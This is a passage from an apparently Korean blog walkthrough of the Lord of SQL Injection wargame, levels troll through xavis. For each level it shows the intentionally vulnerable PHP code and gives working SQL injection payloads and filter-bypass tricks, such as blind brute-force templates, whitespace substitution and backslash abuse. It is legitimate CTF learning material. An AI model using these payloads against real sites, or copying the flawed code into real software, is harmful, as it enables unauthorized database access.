가능합니다. 바꿔 사용하고, like 문을 사용하여 브루트포싱 해보면 답을 알아낼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||id&#x3D;&quot;admin&quot;&amp;&amp;pw like&#39;BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="8-troll"><a href="#8-troll" class="headerlink" title="8. troll"></a>8. troll</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/admin/"</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_troll where id='&#123;$_GET[id]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"troll"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 의 비교문에서는 대소문자를 구분하지 않습니다.<br>따라서 Admin 등을 삽입해 필터링을 우회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;Admin</span><br></pre></td></tr></table></figure><h3 id="9-vampire"><a href="#9-vampire" class="headerlink" title="9. vampire"></a>9. vampire</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $_GET[id] = strtolower($_GET[id]);</span><br><span class="line">  $_GET[id] = str_replace(<span class="string">"admin"</span>,<span class="string">""</span>,$_GET[id]); </span><br><span class="line">  $query = <span class="string">"select id from prob_vampire where id='&#123;$_GET[id]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"vampire"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>대소문자 구분없이 admin 문자열을 삭제하고 있습니다.<br>하지만 정규식 변환이 아닌 단순 치환이므로 adadminmin등의 문장을 삽입하여 우회할 수 있습니다.<br>이런 코드는 종종 보안 취약점을 발생시키는데, 제거되는 문장을 알고 있다면 chrome auditor, waf 등을 쉽게 우회할 수 있도록 해주는 마법의 단어가 되기도 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;adadminmin</span><br></pre></td></tr></table></figure><h3 id="10-skeleton"><a href="#10-skeleton" class="headerlink" title="10. skeleton"></a>10. skeleton</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"skeleton"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제를 모두 해결하였다면, 쉽게 해결할 수 있는 문제입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw&#x3D;&#39;||id&#x3D;&quot;admin&quot;#</span><br><span class="line">Solution2 : pw&#x3D;&#39;||id&#x3D;&quot;admin&quot;||&#39;1</span><br></pre></td></tr></table></figure><h3 id="11-golem"><a href="#11-golem" class="headerlink" title="11. golem"></a>11. golem</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and|substr\(|=/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"golem"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>or, and, substring, = 등을 차단하고 있지만 동일한 기능을 하는 ||, &amp;&amp;, mid, like 으로 대체할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;&#39;||id like&quot;admin&quot;&amp;&amp;pw like&#39;%</span><br></pre></td></tr></table></figure><h3 id="12-darkknight"><a href="#12-darkknight" class="headerlink" title="12. darkknight"></a>12. darkknight</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"darkknight"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>싱글쿼트는 필터링 되어 있지만 쿼트처리가 되어있지 않은 no 파라미터에서 더블쿼트 또는 hex 인코딩를 사용하면 Blind injection이 가능합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;1&amp;no&#x3D;1||id like &quot;admin&quot; &amp;&amp; pw like &quot;BRUTE_HERE%&quot;</span><br></pre></td></tr></table></figure><h3 id="13-bugbear"><a href="#13-bugbear" class="headerlink" title="13. bugbear"></a>13. bugbear</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=|or|and| |like|0x/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_bugbear where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_bugbear where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"bugbear"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>필터링 되는 단어가 조금 늘어났습니다.<br>지금까지 애용해왔던 like도 필터링 되므로 instr 함수를 사용해 한글자씩 브루트포싱 해 줍시다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;1&amp;no&#x3D;1||instr(id,&quot;admin&quot;) &amp;&amp; instr(pw,&quot;BRUTE_HERE&quot;)</span><br></pre></td></tr></table></figure><h3 id="14-giant"><a href="#14-giant" class="headerlink" title="14. giant"></a>14. giant</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ |\n|\r|\t/i'</span>, $_GET[shit])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select 1234 from&#123;$_GET[shit]&#125;prob_giant where 1"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="number">1234</span>]) solve(<span class="string">"giant"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>화이트 스페이스 문제입니다.<br>mysql에서는 구분자로서 %09, %0a, %0b, %0c, %0d, %2b 를 사용할 수 있는데<br>%2b는 문맥에 의존적이므로 이 문제에서는 사용이 불가하네요.<br>따라서 %0b, %0c 가 문제의 답입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : shit&#x3D;%0c</span><br></pre></td></tr></table></figure><h3 id="15-assassin"><a href="#15-assassin" class="headerlink" title="15. assassin"></a>15. assassin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_assassin where pw like '&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"assassin"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>놀랍게도 패스워드 검증에 like 문이 사용되었습니다.<br>like문에서 %는 정규식의 .* 와 동일한 역할을 합니다.<br>따라서 % 앞에 한글자씩 브루트포싱 해보면 금새 답을 알 수 있습니다.<br>guest 와 admin 계정의 패스워드 앞 부분이 일치하니<br>guest 계정만 나온다고 좌절하지 말고 응답 하나하나 주의깊게 확인합시다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : pw&#x3D;BRUTE_HERE%</span><br></pre></td></tr></table></figure><h3 id="16-zombie-assassin"><a href="#16-zombie-assassin" class="headerlink" title="16. zombie_assassin"></a>16. zombie_assassin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  $_GET[<span class="string">'id'</span>] = strrev(addslashes($_GET[<span class="string">'id'</span>]));</span><br><span class="line">  $_GET[<span class="string">'pw'</span>] = strrev(addslashes($_GET[<span class="string">'pw'</span>]));</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_zombie_assassin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"zombie_assassin"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>addslashes 함수는 특수문자의 앞에 (backslash) 를 삽입하여 SQL 문에서 구문으로서의 쿼트 삽입을 방지하는데 strrev 함수는 백슬래시를 고려하지 않습니다.<br>따라서 id 파라미터에 더블쿼트 등의 addslashes 의 영향을 받는 문자(싱글쿼트를 제외한)를 입력하여 주면 id 파라미터의 쿼트가 백슬래시의 영향을 받아 일반문자열로 취급됩니다. 이후 pw 파라미터에서 항상 참이 나오도록 하고 뒷부분을 주석으로 만들어주면 해결됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&quot;&amp;pw&#x3D;#1||</span><br></pre></td></tr></table></figure><h3 id="17-succubus"><a href="#17-succubus" class="headerlink" title="17. succubus"></a>17. succubus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_succubus where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"succubus"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 동일한 방법으로 해결할 수 있습니다.<br>다만 id 파라미터에 (backslash) 를 직접적으로 삽입해 줍니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;\&amp;pw&#x3D;||1#</span><br></pre></td></tr></table></figure><h3 id="18-nightmare"><a href="#18-nightmare" class="headerlink" title="18. nightmare"></a>18. nightmare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|#|-/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_nightmare where pw=('&#123;$_GET[pw]&#125;') and id!='admin'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"nightmare"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>글자수가 극단적으로 제한되어 있습니다.<br>주석처리에 사용되는 -, # 가 필터링 되어 있으므로<br>;%00를 통해 쿼리문을 종결시켜야 합니다.<br>pw 와의 비교문에서는 다양한 연산자를 통해 참으로 만들어 줄 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Solution1 : pw&#x3D;&#39;)&#x3D;0;%00</span><br><span class="line">Solution2 : pw&#x3D;&#39;)&amp;1;%00</span><br><span class="line">Solution3 : pw&#x3D;&#39;)*1;%00</span><br><span class="line">Solution4 : pw&#x3D;&#39;)&#x2F;1;%00</span><br></pre></td></tr></table></figure><h3 id="19-xavis"><a href="#19-xavis" class="headerlink" title="19. xavis"></a>19. xavis</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/regex|like/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_xavis where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"xavis"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>like 연산자는 필터링 되었지만, instr 함수를 사용하면 패스워드를 브루트포싱 할 수 